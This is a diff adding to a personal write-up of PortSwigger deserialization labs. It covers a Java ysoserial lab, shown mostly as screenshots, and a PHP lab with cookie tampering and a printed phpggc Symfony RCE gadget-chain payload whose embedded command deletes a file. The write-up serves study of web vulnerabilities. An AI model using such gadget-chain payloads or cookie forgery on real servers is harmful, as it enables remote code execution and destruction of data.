@@ -1,4 +1,5 @@
-[PortSwigger Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+[HackTricks Cheat sheet](https://book.hacktricks.xyz/pentesting-web/deserialization)
+[OWASP Cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
 
 [PortSwigger Labs](https://portswigger.net/web-security/deserialization)
 
@@ -173,4 +174,76 @@ TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9j
 
 ![](imgs/2023-10-26-13-03-14.png)
 
-### Lab 05: 
+### Lab 05: Exploiting Java deserialization with Apache Commons
+[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
+
+I tried to decode the cookie and it seems different from the previous lab's cookie
+
+![](imgs/2023-10-27-11-00-06.png)
+
+This cookie begins with the "r00" -> Java serialized object
+
+So i found a tool called [ysoserial](https://github.com/frohoff/ysoserial). This tool helps us generate payloads that exploit unsafe Java object deserialization.
+
+I wrote a script to generate all payloads for the command to exploit the Java serialization.
+
+![](imgs/2023-10-27-13-25-31.png)
+![](imgs/2023-10-27-13-25-58.png)
+
+Use intruder to gend number of cookies contains the generated payload
+![](imgs/2023-10-27-13-36-42.png)
+
+Done!
+![](imgs/2023-10-27-13-37-19.png)
+
+### Lab 06: Exploiting PHP deserialization with a pre-built gadget chain
+[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
+
+Cookie:
+```
+RAW:
+%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3eWxodzdpcGJhN2JrZ2pka3V3dXh6MWNhZG8zdzVkNCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2210c54be275733d14c4a0b07e2d1148cea99d6ef3%22%7D
+URL Decode: 
+{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3eWxodzdpcGJhN2JrZ2pka3V3dXh6MWNhZG8zdzVkNCI7fQ==","sig_hmac_sha1":"10c54be275733d14c4a0b07e2d1148cea99d6ef3"}
+```
+
+![](imgs/2023-10-27-13-58-23.png)
+
+I tried to change user to 'carlos'
+
+```
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3eWxodzdpcGJhN2JrZ2pka3V3dXh6MWNhZG8zdzVkNCI7fQo=
+
+Cookie: 
+%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3eWxodzdpcGJhN2JrZ2pka3V3dXh6MWNhZG8zdzVkNCI7fQo%3D%22%2C%22sig%5Fhmac%5Fsha1%22%3A%2210c54be275733d14c4a0b07e2d1148cea99d6ef3%22%7D
+```
+
+![](imgs/2023-10-27-14-01-38.png)
+
+The server uses Symfony v4.3.6.
+
+HackTricks PHP Deserialization Cheat Sheet:
+![](imgs/2023-10-27-14-03-34.png)
+
+[phpggc - Github](https://github.com/ambionics/phpggc)
+
+Phpggc Symfony support versions:
+![](imgs/2023-10-27-14-08-23.png)
+
+-> We can use Gadget Chains Symfony/RCE4, Symfony/RCE7, Symfony/RCE8, Symfony/RCE9, Symfony/RCE10 and Symfony/RCE11.
+
+
+![](imgs/2023-10-27-14-23-59.png)
+This RCE9 works with command.
+
+Also i need to check the phpinfo() of the server. You can easily found it on BurpSuite Pro :v
+
+![](imgs/2023-10-27-14-17-44.png)
+
+![](imgs/2023-10-27-14-23-26.png)
+
+```
+Tzo0NDoiU3ltZm9ueVxDb21wb25lbnRcUHJvY2Vzc1xQaXBlc1xXaW5kb3dzUGlwZXMiOjE6e3M6NTc6IlN5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUGlwZXNcV2luZG93c1BpcGVzZmlsZUhhbmRsZXMiO086NTA6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yIjoyOntzOjYwOiJTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcml0ZXJhdG9yIjtPOjExOiJBcnJheU9iamVjdCI6NDp7aTowO2k6MDtpOjE7YToyOntpOjA7czo0OiJleGVjIjtpOjE7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO31pOjI7YTowOnt9aTozO047fXM6NTY6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yc29ydCI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO319
+Cookie:
+%7B%22token%22%3A%22Tzo0NDoiU3ltZm9ueVxDb21wb25lbnRcUHJvY2Vzc1xQaXBlc1xXaW5kb3dzUGlwZXMiOjE6e3M6NTc6IlN5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUGlwZXNcV2luZG93c1BpcGVzZmlsZUhhbmRsZXMiO086NTA6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yIjoyOntzOjYwOiJTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcml0ZXJhdG9yIjtPOjExOiJBcnJheU9iamVjdCI6NDp7aTowO2k6MDtpOjE7YToyOntpOjA7czo0OiJleGVjIjtpOjE7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO31pOjI7YTowOnt9aTozO047fXM6NTY6IlN5bWZvbnlcQ29tcG9uZW50XEZpbmRlclxJdGVyYXRvclxTb3J0YWJsZUl0ZXJhdG9yc29ydCI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO319%22%2C%22sig%5Fhmac%5Fsha1%22%3A%2210c54be275733d14c4a0b07e2d1148cea99d6ef3%22%7D
+```
